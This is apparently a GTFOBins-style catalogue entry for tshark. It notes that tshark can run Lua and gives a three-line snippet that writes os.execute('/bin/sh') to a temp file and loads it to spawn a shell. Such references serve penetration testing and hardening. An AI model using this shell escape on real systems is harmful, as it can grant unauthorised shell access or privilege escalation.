---
description: This program is able to execute [`lua`](../less/index.html) code.
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' >$TF
        tshark -Xlua_script:$TF
---
